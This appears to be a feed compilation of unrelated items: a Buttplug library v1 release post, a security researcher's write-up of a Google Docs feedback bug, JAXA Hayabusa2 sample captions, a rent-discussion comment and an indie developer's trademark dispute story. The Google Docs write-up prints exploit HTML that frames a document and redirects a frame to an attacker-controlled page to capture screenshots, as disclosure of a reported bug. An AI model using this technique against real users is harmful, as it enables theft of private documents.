<title>Buttplug (Sex Toy Control Library) Hits v1 Milestone</title>
<link>https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</link>
<guid isPermaLink="true" >https://nonpolynomial.com/2020/12/28/buttplug-hits-v1-milestone/</guid>
<description>&lt;p&gt;After 3.5 years of development, &lt;a href=&quot;https://buttplug.io&quot;&gt;Buttplug&lt;/a&gt;, the open source intimate haptics controls library created and maintained by Nonpolynomial, has finally arrived at its v1 release. Fitting that it’s also the first real blog post on the new &lt;a href=&quot;https://nonpolynomial.com/blog&quot;&gt;Nonpolynomial Blog&lt;/a&gt;!&lt;/p&gt;
&lt;img loading=&quot;lazy&quot; width=&quot;640&quot; height=&quot;640&quot; src=&quot;https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png&quot; alt=&quot;&quot; class=&quot;wp-image-860&quot; srcset=&quot;https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs.png 640w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-300x300.png 300w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-150x150.png 150w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-100x100.png 100w, https://nonpolynomial.com/wp-content/uploads/2020/12/buttplug_rust_docs-480x480.png 480w&quot; sizes=&quot;(max-width: 640px) 100vw, 640px&quot;/&gt;&lt;p&gt;For the project, this is actually a contraction rather than an expansion. Version 1 means that the project has slimmed down to a &lt;a href=&quot;https://github.com/buttplugio/buttplug-rs&quot;&gt;core Rust implementation&lt;/a&gt; upon which the ecosystem can continue to grow.&lt;/p&gt;
&lt;p&gt;Buttplug v1.0.0 is available in the following flavors:&lt;/p&gt;
&lt;p&gt;The &lt;a href=&quot;https://buttplug-developer-guide.docs.buttplug.io&quot;&gt;Buttplug Developer Guide&lt;/a&gt; covers basic usage, with examples in all of the aforementioned languages.&lt;/p&gt;
&lt;h2&gt;What Even Is Buttplug?&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://buttplug.io&quot;&gt;Buttplug&lt;/a&gt; is a haptics abstraction library for intimate hardware.&lt;/p&gt;
&lt;p&gt;Which is a fancy way of saying “a way of telling a bunch of different vibrators how to vibrate”. Though it can tell hardware how to do things other than vibrate, and it supports more form factors than buttplugs.&lt;/p&gt;
&lt;p&gt;Basically, there are &lt;a href=&quot;https://iostindex.com&quot;&gt;hundreds of computer controlled sex toys out there&lt;/a&gt;. Most of them have unique protocols to control them. Buttplug tries to centralize these control protocols, handles cross platform USB/Bluetooth/serial/etc for the developer, and presents a uniform way of controlling the whatever toy the user may have. Instead of knowing what operating system the user is on and how to talk to their specific toy, developers can use Buttplug to enumerate for a supported device, then send generic commands like “vibrate/rotate at [speed]”. That’s it.&lt;/p&gt;
&lt;p&gt;While the sex toy control part of Buttplug is probably the most recognizable and memorable feature, it’s not the only goal of the project. Buttplug was established as an experiment for creating user-focused haptics and interface device abstraction. Libraries and engines like &lt;a href=&quot;https://www.chai3d.org/&quot;&gt;Chai3D&lt;/a&gt; and &lt;a href=&quot;https://h3dapi.org&quot;&gt;H3D&lt;/a&gt; work as generalized haptics engines for studying mechanical systems, texture and force creation/simulation, while other systems like &lt;a href=&quot;https://vrpn.github.io/&quot;&gt;VRPN&lt;/a&gt; work as a sort of user-space HID manager for systems that may not conform to general HID protocol boundaries. Buttplug seeks to take these two paradigms, and smoosh them together while also servicing a niche that doesn’t get much engineering attention. This leads to many interesting questions, like:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;How do we quickly and reliably bring up hardware communication across multiple platforms?&lt;/li&gt;
&lt;li&gt;How do we interact with a user whose affective state may differ from someone using “normal” software like a word processor or database?&lt;/li&gt;
&lt;li&gt;How do we create a language expressive enough to generate the experience a user wants, while also abstract enough to not be device specific?&lt;/li&gt;
&lt;li&gt;What are the &lt;a href=&quot;https://buttplug-developer-guide.docs.buttplug.io/intro/buttplug-ethics.html&quot;&gt;ethical implications of building open source technology for intimacy&lt;/a&gt;?&lt;/li&gt;
&lt;li&gt;Can these questions be approached through technology in a way that is maintainable by a small, possibly one person team?&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;We’ve heard from our community that some users are just interested in controlling sex toys, though, and that’s fine too. I guess.&lt;/p&gt;

&lt;h2&gt;A Short-ish History of Buttplug&lt;/h2&gt;
&lt;p&gt;Here’s an overview of the 16 year path from my start in sex tech to a v1 library for the field.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;2004
&lt;/li&gt;
&lt;li&gt;2007
&lt;/li&gt;
&lt;li&gt;2013
&lt;/li&gt;
&lt;li&gt;Fall 2016
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/buttplugio/buttplug-rs&quot;&gt;First Rust implementation.&lt;/a&gt; Stalls due to lack of platform support for Bluetooth (most hardware we interact with is Bluetooth LE) and other hardware.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;April 2017
&lt;/li&gt;
&lt;li&gt;May 2017
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/buttplugio/buttplug-js&quot;&gt;First JS implementation&lt;/a&gt;, using WebBluetooth to access BTLE through the Chrome web browser. Later included native Node implementation using &lt;a href=&quot;https://github.com/noble/noble&quot;&gt;noble&lt;/a&gt; and other hardware libraries.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;August 2017
&lt;/li&gt;
&lt;li&gt;December 2017
&lt;ul&gt;&lt;li&gt;Generic messages added to the Buttplug Protocol Spec, making it easier to command a wide range of devices. Due to maintenance timing and life in general, this is the last change to protocol spec for the next 3 years.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;April 2019
&lt;/li&gt;
&lt;li&gt;May 2019
&lt;/li&gt;
&lt;li&gt;Sept 2019
&lt;ul&gt;&lt;li&gt;Realize that maintaining 2 full implementations of Buttplug was untenable for a 1 person development team, work started on a new core implementation of Buttplug in (at that point unstable) async Rust, with other language implementations would then live on top of.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;January 2020
&lt;ul&gt;&lt;li&gt;Forked &lt;a href=&quot;https://github.com/mwylde/rumble&quot;&gt;Rumble&lt;/a&gt; into &lt;a href=&quot;https://github.com/deviceplug/btleplug&quot;&gt;btleplug&lt;/a&gt; (begrudgingly changing the name because rumble would’ve been GREAT to have in Buttplug but the original author was AWOL so package couldn’t be transfers on crates.io), brought up minimum BTLE capabilities in Windows, macOS, and Linux.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;October 2020
&lt;ul&gt;&lt;li&gt;Core async Rust Buttplug implementation hits feature parity with the C# and JS libraries. &lt;a href=&quot;https://github.com/buttplugio/buttplug-rs-ffi&quot;&gt;Move to porting C#/JS to using Rust via FFI&lt;/a&gt;. C# calls into the native Rust library using exported C calls, while JS uses a WASM layer.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;December 2020
&lt;ul&gt;&lt;li&gt;v1 release, along with the first shipping of a new spec version since December 2017. FFI C#/JS libraries at parity with original native C#/JS libraries, original native libraries deprecated and archived. &lt;a href=&quot;https://buttplug-developer-guide.docs.buttplug.io&quot;&gt;Buttplug Developer Guide&lt;/a&gt; in good enough shape to guide users on building simple Buttplug Applications. &lt;a href=&quot;https://metafetish.com&quot;&gt;Metafetish&lt;/a&gt; closes after 16 years in order to make way for new &lt;a href=&quot;https://nonpolynomial.com/blog&quot;&gt;Nonpolynomial blog&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;What Buttplug Version 1 Means&lt;/h2&gt;
&lt;p&gt;To me, a lot. To you, possibly not so much.&lt;/p&gt;
&lt;p&gt;As mentioned, Buttplug Version 1 doesn’t really come with a lot of new features. It’s mostly a point where I can cut old stuff and start looking toward the future.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/buttplugio/buttplug-csharp&quot;&gt;Buttplug C#&lt;/a&gt; and &lt;a href=&quot;https://github.com/buttplugio/buttplug-js&quot;&gt;Buttplug JS&lt;/a&gt; will now be archived, as implementations now live in our &lt;a href=&quot;https://github.com/buttplugio/buttplug-rs-ffi&quot;&gt;FFI repo&lt;/a&gt;, and their respective &lt;a href=&quot;https://www.nuget.org/packages/Buttplug/&quot;&gt;nuget&lt;/a&gt; and &lt;a href=&quot;https://www.npmjs.com/package/buttplug&quot;&gt;npm&lt;/a&gt; packages will still live on as v1 and beyond. There will definitely be breaking changes between the v0.x and v1 versions for C#/JS, so if you’ve been developing on those, be ready. I did my best to keep the APIs similar, but also used this as a way to clean up some problems that had cropped up along the way.&lt;/p&gt;
&lt;p&gt;Before v1, adding new features or hardware protocols meant implementing things in at least 2 places. Now, features can be implemented in Rust, then all that is required is a rebuild of the FFI and package version numbers being rolled. At worse, the FFI API surface may require changes, but that’s fairly trivial work versus having to redo full feature implementations. Most of the FFI work is up front in the initial implementation, and the hope is that continued maintenance will be much simpler. Time will tell whether this was a total mistake.&lt;/p&gt;
&lt;p&gt;Success will be measured via this possible reduction of rote coding work. I’d like to spend more time on design with a flexible system versus having to re-implement my ideas multiple times to test them out across all platforms.&lt;/p&gt;
&lt;p&gt;The Version 1 release will also probably be the only time that multiple libraries are released in lockstep with the same version number. I suspect that the FFI libraries will have API surface level issues that will require major version rolls outside of when the rust library updates. Everyone who has an affinity for version numbers, enjoy these stars aligning now, because it’s probably the last time it’ll happen.&lt;/p&gt;
&lt;h2&gt;What’s Next&lt;/h2&gt;
&lt;p&gt;There’s so many directions to go now that it’s almost hard to pick which to start with, but here’s some general ideas of what I’d like to do next:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Blog Posts
&lt;ul&gt;&lt;li&gt;I have this shiny new blog now and I’d like to use it more. I have a lot of thoughts about Rust, WASM, and other technologies I’m using that I’d like to cover here.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Documentation
&lt;ul&gt;&lt;li&gt;Buttplug v1 is documented just enough to maybe get people started, but the &lt;a href=&quot;https://buttplug-developer-guide.docs.buttplug.io&quot;&gt;developer guide&lt;/a&gt; and API documentation for the various implementations definitely need more love.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;More FFI Implementations
&lt;ul&gt;&lt;li&gt;Python is on the way soon, and C/C++ (especially for Unreal Engine suppot) and Java/Kotlin have been requested by the community.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Application Updates
&lt;/li&gt;
&lt;li&gt;Hardware Support
&lt;ul&gt;&lt;li&gt;The v1 slog (this was supposed to be done in October, then &lt;a href=&quot;https://www.supergiantgames.com/games/hades/&quot;&gt;Hades&lt;/a&gt; happened. Oops.) means hardware support for things like the &lt;a href=&quot;https://patreon.com/tempestvr&quot;&gt;OSR2&lt;/a&gt; and &lt;a href=&quot;https://github.com/buttplugio/buttplug-rs/issues/151&quot;&gt;Nintendo Joycon&lt;/a&gt; are still in development and running behind.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Actually Making New Stuff
&lt;ul&gt;&lt;li&gt;Everything listed so far is continued maintenance. It’d be nice to actually make some new things too. Don’t know what those will be, but I need to actually create with my creation, instead of just creating my creation.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;Thanks&lt;/h2&gt;
&lt;p&gt;Thanks go to:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Loved ones and friends who’ve had to put up with me being “The Buttplug Guy” for the past 16 years (with no sign of that ending soon).&lt;/li&gt;
&lt;li&gt;My &lt;a href=&quot;https://patreon.com/qdot&quot;&gt;Patreon&lt;/a&gt; and &lt;a href=&quot;https://github.com/sponsors/qdot&quot;&gt;Github Sponsors&lt;/a&gt; Subscribers, who’ve kept the project funded enough for me to buy new hardware.&lt;/li&gt;
&lt;li&gt;My consulting clients for &lt;a href=&quot;https://nonpolynomial.com&quot;&gt;Nonpolynomial&lt;/a&gt;, who’ve helped keep the business cash positive while also helping my project along with support in their products.&lt;/li&gt;
&lt;li&gt;Everyone who worked on reverse engineering toys and donating info to our &lt;a href=&quot;https://stpihkal.docs.buttplug.io&quot;&gt;Sex Toys Protocols I Have Known And Loved (STPIHKAL)&lt;/a&gt; documentation project.&lt;/li&gt;
&lt;li&gt;Sex tech projects like &lt;a href=&quot;https://iostindex.com&quot;&gt;IOSTIndex&lt;/a&gt;, &lt;a href=&quot;https://xtoys.app&quot;&gt;XToys&lt;/a&gt;, &lt;a href=&quot;https://eroscripts.com&quot;&gt;Eroscripts&lt;/a&gt;, and others who manage information and help grow sex tech communities in other directions. Buttplug is just a small component in what will hopefully be a larger ecosystem and community someday.&lt;/li&gt;
&lt;li&gt;The community of developers who’ve been using the library, either as part of project they’ve shared with communities, or even for things they’ve just done for themselves and kept closed. It’s nice to know people are using things I build.&lt;/li&gt;
&lt;li&gt;People who’ve been watching and interacting on social media, at conferences, etc… This project is as much if not more social than it is technical, so it’s been great to get other perspectives.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Having Buttplug hit v1 feels great, but there’s no time to rest. &lt;strong&gt;On to v2!&lt;/strong&gt;&lt;/p&gt;

<title>Stealing private documents through a bug in Google Docs</title>
<link>https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/</link>
<guid isPermaLink="true" >https://savebreach.com/stealing-private-documents-through-a-google-docs-bug/</guid>
<description>&lt;p&gt;By &lt;a href=&quot;https://twitter.com/kl_sree&quot;&gt;KL Sreeram&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Google has integrated a &lt;a href=&quot;https://www.google.com/tools/feedback&quot;&gt;feedback sharing mechanism&lt;/a&gt; for many of its products like Google Docs, Google Sheets and so on. This feature is supposed to help users report bugs and broken functionality to Google developers who could then work on fixing it.&lt;/p&gt;
&lt;h2 id=&quot;sending-feedback-in-google-products&quot;&gt;Sending Feedback in Google Products&lt;/h2&gt;
&lt;p&gt;You might have noticed a &lt;strong&gt;Send Feedback&lt;/strong&gt; button at the bottom of the page while using Google Docs. It's a harmless feature, and its implemented as a feed back sharing system for Google Docs when you encounter issues. When you click on the button, a popup would appear asking you to describe the problem and this feature automatically takes a screenshot, sending (uploading) the data to Google for further review.&lt;/p&gt;
&lt;img src=&quot;https://savebreach.com/content/images/2020/12/image-22.png&quot; class=&quot;kg-image&quot; alt=&quot;&quot;/&gt;The &quot;Send Feedback&quot; popup in Google Docs
&lt;p&gt;This feedback sharing feature is also implemented in many other Google products using an iFrame, embedded into the parent page (the Google Product).&lt;/p&gt;
&lt;p&gt;This made me wonder how Google was displaying this image. I found, the image was being uploaded to Google via postMessage, and then rendered in the popup box before being sent to Google for further investigation.&lt;/p&gt;
&lt;h2 id=&quot;the-bug&quot;&gt;The Bug&lt;/h2&gt;
&lt;p&gt;There was some cross-origin communication happening between docs.google.com, www.google.com and feedback.googleusercontent.com (which was a sandboxed domain). Even after trying a lot I was unable to find any XSS in feedback.googleusercontent.com which could have helped me in stealing the screenshot image data.&lt;/p&gt;
&lt;p&gt;Below is a graphical representation of the steps in this process –&lt;/p&gt;
&lt;img src=&quot;https://savebreach.com/content/images/2020/12/image-23.png&quot; class=&quot;kg-image&quot; alt=&quot;&quot;/&gt;How the screenshot was uploaded to Google servers
&lt;p&gt;The following &lt;code&gt;postmessage&lt;/code&gt; function sent the data to feedback.googlusercontent.com, however the postmessage configuration didn't allow other domains to be iFramed.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-JS&quot;&gt;windowRef.postmessage(&quot;&amp;lt;Data&amp;gt;&quot;,&quot;https://feedback.googleusercontent.com&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;However, the final &lt;code&gt;postmessage&lt;/code&gt; function upon submitting the feedback was configured in a manner that allowed modifying the iFrame to an evil website&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-JS&quot;&gt;windowRef.postmessage(&quot;&amp;lt;Data&amp;gt;&quot;,&quot;*&quot;);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The wildcard scope allowed the &lt;code&gt;postmessage&lt;/code&gt; data to be sent to an evil attacker controlled domain. The security misconfiguration here is the wildcard scope &lt;code&gt;*&lt;/code&gt;  that allowed me to steal and hijack Google Docs screenshots which were meant to be uploaded to Google's servers&lt;/p&gt;
&lt;p&gt;Also, worth noting that the exploit worked in this case as Google Docs, by design has no &lt;code&gt;X-Frame-Options header&lt;/code&gt;, which eventually helped exploit the cross-origin communication (through postMessage), although they do have some other protection against clickjacking and similar attacks as most features are disabled when the Google Docs pages are embedded in an iFrame.&lt;/p&gt;
&lt;h2 id=&quot;the-final-exploit&quot;&gt;The Final Exploit&lt;/h2&gt;
&lt;p&gt;Finally, I was able to put together all these vulnerabilities, in order to extract the Google Docs page screenshot by embedding it in a malicious iFrame and using &lt;code&gt;window.frames.frame.location&lt;/code&gt; to load my exploit page from an external domain and steal user's Google Docs page screenshot&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-HTML&quot;&gt;&amp;lt;html&amp;gt;
    &amp;lt;iframe src=&quot;https://docs.google.com/document/document_ID&quot; /&amp;gt;
    &amp;lt;script&amp;gt;
       //pseudo code
        
        
        setTimeout(function(){ alert(&quot;Hello&quot;); }, 6000);

        function exp(){
        setInterval(function(){ 
         window.frames[0].frame[0][2].location=&quot;https://geekycat.in/exploit.html&quot;;
        }, 100);
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The above exploit gets triggered only once the user clicks on &lt;strong&gt;Send Feedback&lt;/strong&gt; button. For allowing the iFrame to load, a setTimeout function executes every 6s (or, 6000 ms). To hijack the frame once it loads – the setInterval is used which tries to change the location of the iFrame every 100 ms to ensure the screenshot is stolen once the iFrame loads.&lt;/p&gt;
&lt;p&gt;This could have allowed any attacker to steal sensitive information about your Google Docs documents and presentations, since organizations use it as part of G Suite for managing highly sensitive information. Although, this attack needs some user interaction but its not impossible given an attacker can easily convince a victim to perform the needed interaction (button click).&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;exploit.html&lt;/code&gt; contains a postMessage event listener that captures the URL of the uploaded image, and the attacker successfully exfiltrates the Google Docs page screenshot in this way.&lt;/p&gt;
&lt;h2 id=&quot;video-poc-of-the-exploit&quot;&gt;Video PoC of the Exploit&lt;/h2&gt;
&lt;p&gt;Below is a Proof of Concept video of how the exploit worked, and how it could have allowed any attacker to steal screenshots of your private Google Docs documents by loading it in an iFrame on an attacker controlled website.&lt;/p&gt;

&lt;p&gt;The lid of chamber A in the sample catcher was opened on December 15, 2020 at around 11:10 JST, and we could confirm a sample had been collected inside. This is material gathered during the first touchdown of Hayabusa2.&lt;br/&gt;Credit：JAXA&lt;/p&gt;

&lt;p&gt;【Photo】Sample catcher chamber A, captured by an optical microscope&lt;/p&gt;
&lt;p&gt;Many particles larger than 1mm were found in both chambers A and C. It appears that the particles in chamber C are typically bigger than those in chamber A. Chamber C material was gathered during the second touchdown, which is expected to contain subsurface material ejected from the creation of the artificial crater.&lt;br/&gt;Credit：JAXA&lt;/p&gt;

&lt;p&gt;【Photo】Sample catcher chamber C, captured by an optical microscope&lt;/p&gt;
&lt;p&gt;Artificial material seems to be present in chamber C. The origin is under investigation, but a probable source is aluminium scraped off the spacecraft sampler horn as the projectile was fired to stir up material during touchdown.&lt;br/&gt;Credit：JAXA&lt;/p&gt;

<title>Average Rent in San Francisco Has Dropped $1k This Year</title>
<link>http://socketsite.com/archives/2020/12/average-rent-in-san-francisco-has-dropped-1000-this-year.html</link>

<description>&lt;p&gt;bankruptcies filed by whom? Globalist, remote landlords who read somewhere on the web that S.F. has a workforce that has been bludgeoned into thinking that it’s usual to pay north of 40% of a tenant’s income toward rent and therefore it’s a good residential real estate market to invest in? I don’t think those people are going to go bankrupt, they have more money than they know what to do with and many of them are just trying to squirrel their money out of their home countries.&lt;/p&gt;
&lt;p&gt;Maybe a minority of already local, penny ante landlords who have a job and lease out property as passive income and happen to be overleveraged, they might have to file for a Chapter 13, but so what. The only people that lose out in that scenario are the lenders.&lt;/p&gt;
&lt;p&gt;AJ is probably correct, if we have a mini exodus with a bit more duration than what happened after the dot com implosion, rents will drop dramatically and the landlords who don’t have the stomach to face that will just sell their properties to other landlords who are sufficiently capitalized.&lt;/p&gt;

<title>The Fight for WorldBox</title>
<link>https://www.reddit.com/r/Worldbox/comments/jmplqw/the_fight_for_worldbox_or_how_a_game_you_worked/</link>
<guid isPermaLink="true" >https://www.reddit.com/r/Worldbox/comments/jmplqw/the_fight_for_worldbox_or_how_a_game_you_worked/</guid>
<description>&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;My name is Maxim and I’m an independent game developer ( indie dev ). That means that I create a lot of games on my own, and so far self-publish them without the help of bigger firms. All of my income comes from the games I create - it’s my livelihood.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;This is my story on how a game I’ve been working on for over 8 years has been nearly stolen from me without my knowledge.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;And how I’m not the only one.&lt;/p&gt;
&lt;p&gt;When you spit out your coffee&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;The story begins with me working on the latest &lt;a href=&quot;http://superworldbox.com&quot; class=&quot;_3t5uN8xUmg0TOwRCOGQEcU&quot; rel=&quot;noopener nofollow ugc&quot; target=&quot;_blank&quot;&gt;WorldBox&lt;/a&gt; update - the community has been waiting for it for a few months already. Boats are all the rage, and everybody is going wild with anticipation. When a message hits me on the community discord.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;&quot;Somebody copied the game - it looks just like yours&quot;.&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;You don't think much of it. There are many copy-cats out there of successful titles. If a new indie is trying to have their shot at a different populous type of game - have a go at it! It's harder than you think - but no problems there.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;&quot;They called it worldbox in the app id&quot;.&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Aham, why would somebody do that? You assume negligence over maliciousness at first. Believe in the good of the people.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;&quot;And they filed a trademark for WorldBox&quot;.&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Ok. The boats update will have to wait now for a bit longer.&lt;/p&gt;

&lt;p&gt;Prelude&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;I've been working on WorldBox since 2012, with the first prototype released on newgrounds and kongregate. In between other games, I continued work on it, and finally released a mobile version in 2018. It grew a lovely and highly active community since then - and I've kept it updated as much as possible.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;With millions of downloads it is definitely my most successful game so far, and that’s thanks to a very active fan base which I’m very grateful to have.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Growing a community for a single developer is not easy - it can be quite challenging. A lot of work behind the scenes is involved - and next to the reddit and discord I also attend game conferences from time to time for this purpose.&lt;/p&gt;
&lt;p&gt;The conference&lt;/p&gt;

&lt;div class=&quot;_2-UiOdhyj4wHBv7Rc2FeDr c1cmiB1jfdq4sxidlPDAx&quot;&gt;
&lt;div class=&quot;_3Oa0THmZ3f5iZXAQ0hBJ0k _2LjgQiHLCZ9LDbCQx5KaOi&quot;&gt;&lt;a href=&quot;https://preview.redd.it/88pkqg8g48x51.png?width=715&amp;amp;format=png&amp;amp;auto=webp&amp;amp;s=87b10b8e8cbd74302acf3400d1ba6f9e374082e7&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;img alt=&quot;r/Worldbox - The fight for WorldBox, or how a game you worked on for 8 years may be stolen from you without you even knowing it&quot; class=&quot;_2_tDEnGMLxpM6uOa2kaDB3 ImageBox-image media-element _1XWObl-3b9tPy64oaG6fax&quot; src=&quot;https://preview.redd.it/88pkqg8g48x51.png?width=715&amp;amp;format=png&amp;amp;auto=webp&amp;amp;s=87b10b8e8cbd74302acf3400d1ba6f9e374082e7&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p class=&quot;FJNSiirwoPtG58aeGw2Jx&quot;&gt;Worldbox at DevGamm conference in Minsk in 2019&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;One of which was &lt;strong class=&quot;_12FoOEddL7j_RgMQN0SNeU&quot;&gt;DevGamm&lt;/strong&gt; in November 2019. It was a big trip, which me and my brother took - and apart from an exploding laptop charger it was very positive. &lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;Or so we thought.&lt;/em&gt;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;It's really cool to see people play the game in front of your eyes. You see them explore and discover new powers - you hear invaluable feedback. You connect with really cool people! At least most of them.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;For other people attending dev conferences is about discovering new games, new developers - or just plain and simple hanging out with like-minded people.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;And then there are others. Let's say, the wolves in sheep clothes. Or in this case &quot;the only 🕴️ suit at an indie game conference&quot;. They approach you - see the buzz your game is making, and involve you in a friendly chat.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;They speak highly of their own business skills. They present solutions to company formations, taxation, business models. They talk about &quot;how to be successful in the game business&quot;. They are already very successful and proud of their own &quot;product&quot; - run and developed by a company of 30+ people. It sounds impressive of course.&lt;/p&gt;

&lt;p&gt;The offer&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Then they say that they like your &quot;product&quot;, and want to buy it right away. For some very big amount, right now.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;Now let's take a step back - it's not the first time it happened. You politely listen, make internal notes and evaluate the offer later on. And that's what you're here for, right? Expand the community, expand the business horizons. Stay friendly, create new connections.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;You evaluate behavior - are they passionate gamers? Or rather cold business people. Do they understand the joy that games can bring, or do they see them solely as products that make money? I’m sure you can guess what I was thinking.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;You check out their game - it looks like a copy of a popular game you know. It seems to make a lot of money as well. It’s in the top #5-#9 on the Apple Appstore in the &quot;Adventures&quot; category - that's a lot of $! Enough to run a company of 30+ people and then some.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;The main hook seems to be a free trial for 3 days, after which you pay $9.99 per week(!) to play the game. Something smelled sus.&lt;/p&gt;
&lt;p&gt;The answer&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;So as with many other people who offered to buy the game - you politely decline. It's not the right time. Not only did I not feel like this was the right partner for me at that point - but I also felt like I haven't achieved the full vision of the game yet. Selling would focus too much on &lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;making money&lt;/em&gt;. Changing the code so other developers would understand it, etc. I want to focus on making it &lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;fun&lt;/em&gt;. Take my time to polish it. Bring updates to existing players.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;They asked again 3-4 more times, over the messages and calls, over the following months. You stay polite, stay in touch.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;But they... behind the scenes... are already preparing how to &lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;take advantage of what you created.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Connecting the dots&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&quot;Maxim, somebody filed a trademark for WorldBox&quot;&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;You check out the company, it doesn't ring a bell. It was just registered a few months ago. You look up the business owners - they also don't ring a bell. You cross-check other companies they are involved in... bingo. They are in other companies owned by the &quot;🕴️suit&quot;. You even find his email address mentioned in the formation documents.&lt;/p&gt;
&lt;p class=&quot;_1qeIAgB0cPwnLhDF9XSiJM&quot;&gt;&lt;em class=&quot;_7s4syPYtk5hfUIjySXcRE&quot;&gt;&lt;strong class=&quot;_12FoOEddL7j_RgMQN0SNeU&quot;&gt;Main culprit: found.&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
